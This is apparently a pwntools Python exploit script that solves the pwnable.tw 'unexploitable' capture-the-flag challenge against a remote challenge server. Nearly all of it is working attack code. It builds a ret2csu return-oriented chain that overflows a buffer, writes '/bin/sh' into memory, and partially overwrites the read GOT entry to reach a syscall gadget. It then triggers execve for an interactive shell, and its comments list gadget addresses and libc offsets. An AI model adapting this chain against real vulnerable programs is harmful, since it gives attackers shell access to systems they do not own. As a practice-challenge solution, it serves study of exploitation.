from pwn import *


# r = process("./unexploitable")
r = remote("chall.pwnable.tw", 10403)
libc = ELF('libc_64.so.6')
chall = ELF('./unexploitable')


bss = chall.bss()
read_got = chall.got['read']
sleep_got = chall.got['sleep']
main_addr = chall.symbols['main']

# print(hex(chall.symbols['main']))
# print(hex(chall.got['read']))
# print(hex(chall.bss()))

csu_pop = 0x4005e6
csu_call = 0x4005d0

def set_args(rsp_8, rbx, rbp, r12, r13, r14, r15, ret):
    return p64(rsp_8) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

payload = b'a'*0x18 \
    + p64(csu_pop) \
    + set_args(0, 0, 1, read_got, 0, bss+0x100, 8, csu_call) \
    + set_args(0, 0, 1, 0, 0, 0, 0, main_addr)

input("@")


r.send(payload)
# input("@")

r.send(b'/bin/sh\x00')
# input("@")
sleep(5)

payload2 = b'a'*0x18 \
    + p64(csu_pop) \
    + set_args(0, 0, 1, read_got, 0, read_got, 1, csu_call) \
    + set_args(0, 0, 1, read_got, 0, bss, 59, csu_call) \
    + set_args(0, 0, 1, sleep_got, bss+0x100, 0, 0, csu_call)

r.sendline(payload2)
# input("@")

# r.send(b'\x37') libc-2.31 => 0x...37 <__waitd+103>:	syscall
r.send(b'\xde') 
# r.send(b'\xfb') # libc-2.23 => 0x...fb <pause+43>:	syscall

# input("@")

r.send(b'a'*59)


# [GOAL]
#   1. leak libc
#       * read(0, 0x601000, )
#       * write(1, 0x601000, 0x8)
#   2. one_gadget
#       * 


# 0x0000000000400293 : add edi, ebx ; retf
# 0x0000000000400511 : pop rbx ; pop rbp ; ret
# 0x0000000000400600 : mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
# 0x0000000000400510 : or byte ptr [rbx + 0x5d], bl ; ret
# rbx = 0x600fb3 
# [0x601010]|0xb3 

# libc_read = 
# libc_write = libc_read + 0xa0
# input("@")
# r.send(b'\x00')
r.interactive()